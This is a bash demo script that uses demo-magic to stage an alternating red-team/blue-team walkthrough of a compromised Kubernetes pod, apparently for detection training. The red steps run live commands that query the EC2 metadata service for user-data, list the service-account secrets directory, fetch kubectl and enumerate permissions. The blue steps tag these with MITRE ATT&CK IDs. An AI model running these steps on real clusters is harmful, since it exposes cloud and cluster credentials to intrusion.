#!/bin/bash

cd /root
. $PGPATH/demo/demo-magic.sh

# demo-magic
TYPE_SPEED=50
PROMPT_TIMEOUT=3
DEMO_PROMPT="${GREEN}➜ ${CYAN}\W "

# script
NO_WAIT=true
clear
wait

p "${GREEN}# Here's my shell."
wait

pe "id"
wait

p "${GREEN}# Cool. This did work since I'm using a well known a standard image which is apparently whitelisted."
wait
wait

clear
echo
echo "===== ENTER blue ====="
echo

echo "(T1059.004)Terminal shell in container"
echo

p "${GREEN}# Uh, got a terminal shell running on one of our clusters..."
p "${GREEN}# hmm. Shell was created within the pod debug running in the default namespace."
p "${GREEN}# The container is using an ubuntu (???) image and the running process is bash."
p "${GREEN}# Let's see what happens..."
wait
wait

clear
echo
echo "===== ENTER red ====="
echo
p "${GREEN}# So, this is ubuntu which is pretty limited. I have quite some tools available I found at somewhere."
p "${GREEN}# I do need curl, though...."
wait

pe "apt update && apt install -y curl"
wait

p "${GREEN}# Let's see what we can do now. First, query some info about the node I'm running on"
wait

pe "curl http://169.254.169.254/latest/meta-data/local-hostname"
echo
wait

p "${GREEN}# So, this my current hostname"
wait

p "${GREEN}# How does the user data that was provided at instance creation look like? Sometimes there is"
p "${GREEN}# valuable information..."
wait

pe "curl http://169.254.169.254/latest/user-data"
echo
wait

p "${GREEN}# Hmm, looks interesting, at least I now know the public API endpoint of the cluster. I save"
p "${GREEN}# that for later."
wait

API_ENDPOINT=$(curl -s http://169.254.169.254/latest/user-data | sed  -n 's/API_SERVER_URL=\(https:.*\)/\1/p')
pe "curl -k ${API_ENDPOINT}"
echo
wait
wait

clear
echo
echo "===== ENTER blue ====="
echo

echo "(T1613)Contact EC2 Instance Metadata Service From Container"
echo

p "${GREEN}# Someone seems to dig around... He checked the user-data provided at instance creation"
p "${GREEN}# curl http://169.254.169.254/latest/user-data"
echo
wait

p "${GREEN}# Let's continue watching..."
wait
wait

clear
echo
echo "===== ENTER red ====="
echo

p "${GREEN}# Checking my kubernetes possibilitis now"
wait

pe "env | grep -i kube"
wait

p "${GREEN}# Fine, got something to work on, I guess"
wait

p "${GREEN}# Let's see if this works"
wait

pe "curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version"
echo
wait

pe "ls /var/run/secrets/kubernetes.io/serviceaccount"
wait

p "${GREEN}# I have the typical Kubernetes-related environment variables defined"
p "${GREEN}# I can see that the Kubernetes version is modern and supported."
p "${GREEN}# There's still hope if the Kubernetes security configuration is sloppy."
wait

p "${GREEN}# Let's check for that next by installing a kubectl."
wait

pe "export PATH=/tmp:$PATH && cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl"
wait

p "${GREEN}# Let's inspect what all we can do:"
wait

pe "kubectl auth can-i --list"
wait

p "${GREEN}# Hmmm, let me think"

sleep 10